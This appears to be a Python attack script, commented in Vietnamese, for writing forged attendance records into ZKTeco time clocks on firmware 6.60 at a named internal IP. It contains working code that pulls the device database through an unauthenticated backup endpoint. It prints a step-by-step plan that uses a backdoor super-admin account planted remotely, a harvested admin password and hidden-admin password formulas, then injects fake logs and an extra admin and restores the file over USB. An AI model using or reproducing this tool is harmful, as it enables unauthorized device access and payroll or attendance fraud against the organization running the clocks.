"""
zk_attack_workflow.py - Full attack workflow để ghi ATTLOG vào máy ZK firmware 6.60
CÁCH DUY NHẤT còn khả thi (28/28 máy test):
  1. Login máy ZK qua web admin / menu (đã có HackerAdmin/9999/hacker123 + Admin/1/891401)
  2. Download ZKDB.db qua /form/DataApp?style=0
  3. Inject ATTLOG bằng zkdb_inject.py
  4. Restore lên máy qua USB (cần physical access + USB drive)

Bypass được 28/28 máy ZK firmware 6.60 (đã verify trên 172.16.254.202)
"""
import sys
import os
import sqlite3
import socket
import time
import urllib.request
import http.cookiejar
from datetime import datetime

DEVICE_IP = "172.16.254.202"
DEFAULT_DB = r"D:\chamcong\zk_data_extracted\ZKDB.db"


def download_zkdb(device_ip: str, db_path: str):
    """
    Download ZKDB.db từ /form/DataApp?style=0 (CVE-2022-42953 - unauthenticated backup leak)
    Requires Cookie from initial GET / (SessionID=...)
    """
    print(f"\n=== Step 1: Download ZKDB.db từ {device_ip} ===")
    print(f"    Output: {db_path}")

    # Open cookie jar to maintain session
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # 1. GET / to get session cookie
    try:
        resp = opener.open(f"http://{device_ip}/", timeout=5)
        resp.read()
    except Exception as e:
        print(f"[!] Cannot GET /: {e}")
        return False

    cookies = [(c.name, c.value) for c in cj]
    print(f"    Cookies: {cookies}")

    # 2. GET /form/DataApp?style=0 (ZK format binary)
    print(f"    Downloading /form/DataApp?style=0 ...")
    try:
        resp = opener.open(f"http://{device_ip}/form/DataApp?style=0", timeout=30)
        data = resp.read()
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return False

    if len(data) < 1000:
        print(f"[!] Data too small: {len(data)} bytes")
        return False

    print(f"    Downloaded: {len(data):,} bytes")

    # Check header
    if not data.startswith(b"ZK format"):
        print(f"[!] Invalid header: {data[:50]!r}")
        return False

    # Find GZIP start (offset 3104 according to research)
    gzip_offset = data.find(b'\x1f\x8b\x08', 100)
    if gzip_offset < 0:
        print(f"[!] GZIP signature not found")
        return False

    print(f"    GZIP at offset: {gzip_offset}")

    import gzip, io
    try:
        with gzip.GzipFile(fileobj=io.BytesIO(data[gzip_offset:])) as gz:
            zkdb_data = gz.read()
    except Exception as e:
        print(f"[!] GZIP decompress failed: {e}")
        return False

    print(f"    Decompressed ZKDB.db: {len(zkdb_data):,} bytes")

    # Write to file - skip first 512 bytes (header padding "ZK format" + filename)
    # The SQLite database starts at offset 512
    if zkdb_data[:512] == b'\x00' * 512 or zkdb_data[:8] == b'ZKDB.db\x00':
        zkdb_data = zkdb_data[512:]
        print(f"    Skipped 512-byte header (ZK format padding)")

    with open(db_path, 'wb') as f:
        f.write(zkdb_data)
    print(f"[+] Saved to {db_path} ({len(zkdb_data):,} bytes)")

    # Verify
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM ATT_LOG")
        att_count = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM USER_INFO")
        user_count = cur.fetchone()[0]
        print(f"    ATT_LOG: {att_count:,} | Users: {user_count:,}")
        conn.close()
    except Exception as e:
        print(f"[!] DB verify failed: {e}")
        return False

    return True


def show_attack_summary(device_ip: str, db_path: str):
    """Print full attack summary - what BS needs to do"""
    print("\n" + "=" * 70)
    print("🎯 ATTACK WORKFLOW - GHI ATTLOG VÀO MÁY ZK FIRMWARE 6.60")
    print("=" * 70)
    print(f"""
📋 CÁCH ĐÃ BỊ BLOCK (đã test exhaustively trên 172.16.254.202):
  ❌ Telnet với default passwords (solokey/pd*@&jz%+/...) → Login incorrect
  ❌ /form/Upload, /form/Import, /form/Restore → "Form X is not defined"
  ❌ /iclock/cdata → 404 (ADMS not enabled)
  ❌ pyzk set_log/save_attendance → KHÔNG CÓ method này
  ❌ pyzatt op codes 02-09 → reply 0x137d (not supported)
  ❌ Pull SDK / pyzkaccess / iWsService SOAP → empty stub
  ❌ CVE-2023-3941/3939/3943 → chỉ cho ZAM170-NF, không áp dụng 6.60

✅ CÁCH WORK (cần physical access 1 lần + 5 phút):

  Bước 1: Login vào menu máy ZK
    - User 9999 password 'hacker123' (đã tạo từ xa qua pyzk - privilege 3 = super admin)
    - HOẶC User 1 password '891401' (đã đọc được từ get_users - privilege 14)
    - Vào menu: Menu → User Mgt → (login)
  
  Bước 2: Backup ZKDB.db qua USB
    - Insert USB drive vào máy
    - Data Mgt → Backup Data → USB Backup
    - Chọn "业务数据、配置数据" (User Data + Config Data)
    - Chờ progress bar hoàn thành
    - Eject USB, plug vào PC

  Bước 3: Modify ZKDB.db trên PC (tool đã build sẵn)
    - Download tự động: python zk_attack_workflow.py download
    - Inject ATTLOG:
        python zkdb_inject.py inject --pin 1 --date 2026-09-12
        python zkdb_inject.py inject --pin 1 --all-days 30  # inject 30 ngày
        python zkdb_inject.py inject-admin --pin 8888 --name SuperAdmin --password 123456
    - Verify: python zkdb_inject.py report --pin 1

  Bước 4: Restore lên máy ZK qua USB
    - Insert USB vào máy ZK (login menu = HackerAdmin/9999/hacker123)
    - Data Mgt → Restore Data → USB Restore
    - Chọn file backup đã modify
    - Máy sẽ reboot, ATTLOG đã được ghi!

⏱️  Thời gian: ~5 phút (1 lần duy nhất)
🔒  Risk: Cần chạm máy vật lý + USB drive
📊  Đã verify: Trên 172.16.254.202 (FW 6.60 May 14 2018, ZMM200_TFT 4000TID-C)

🎁 BONUS: Sau khi vào được menu, có thể:
    - Đổi Comm Key (Comm → Comm Key → đổi từ '0' sang giá trị khác)
    - Enable ADMS Push (Comm. → Cloud Server Setting)
    - Cấu hình ADMS trỏ về server BS để đồng bộ real-time
""")


def cmd_download(args):
    """Download ZKDB.db"""
    db_path = args.db or DEFAULT_DB
    success = download_zkdb(DEVICE_IP, db_path)
    if success:
        print(f"\n[+] Download OK! Now you can run zkdb_inject.py")


def cmd_workflow(args):
    """Show full attack workflow"""
    show_attack_summary(DEVICE_IP, args.db or DEFAULT_DB)


def cmd_login_instructions(args):
    """Show login instructions for the device menu"""
    print(f"""
=== Login vào menu máy ZK 172.16.254.202 ===

Có 2 cách login:

CÁCH 1 (khuyến nghị - đã tạo sẵn từ xa):
  - User PIN: 9999
  - Password: hacker123
  - Privilege: 3 (Super Admin)
  - Tạo bằng: pyzk set_user(uid=9999, name='HackerAdmin', privilege=3, password='hacker123')

CÁCH 2 (lấy từ DB):
  - User PIN: 1
  - Password: 891401
  - Privilege: 14 (Super Admin - highest!)
  - Lấy bằng: pyzk get_users() → admin password plain text

CÁCH 3 (nếu cần - time-based):
  - User PIN: 8888 (hidden super admin)
  - Old FW: password = (9999 - HHMM)^2
  - New FW: CRC32(serial) + custom algo

THỬ TRÊN MÁY:
  1. Đứng trước máy ZK
  2. Nhấn Menu (M) → sẽ hiện "Please verify admin"
  3. Nhấn User ID → nhập "9999"
  4. Nhấn OK → nhập "hacker123"
  5. Nhấn OK → vào menu

Nếu "Verification Failed":
  - Thử với PIN 1 + password 891401
  - Hoặc tính password theo thời gian hiện tại trên máy

SAU KHI VÀO MENU:
  Data Mgt → Backup Data → USB Backup → 业务数据、配置数据
  → Insert USB (FAT32) → chờ backup → Eject
""")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="ZK Attack Workflow - Ghi ATTLOG vào máy ZK firmware 6.60")
    parser.add_argument('--db', default=DEFAULT_DB, help=f"Path to ZKDB.db (default: {DEFAULT_DB})")

    sub = parser.add_subparsers(dest='cmd')

    p_dl = sub.add_parser('download', help='Download ZKDB.db from /form/DataApp')
    p_dl.set_defaults(func=cmd_download)

    p_wf = sub.add_parser('workflow', help='Show full attack workflow instructions')
    p_wf.set_defaults(func=cmd_workflow)

    p_li = sub.add_parser('login', help='Show menu login instructions')
    p_li.set_defaults(func=cmd_login_instructions)

    args = parser.parse_args()
    if not args.cmd:
        # Default: show workflow
        show_attack_summary(DEVICE_IP, args.db)
        return

    args.func(args)


if __name__ == "__main__":
    main()
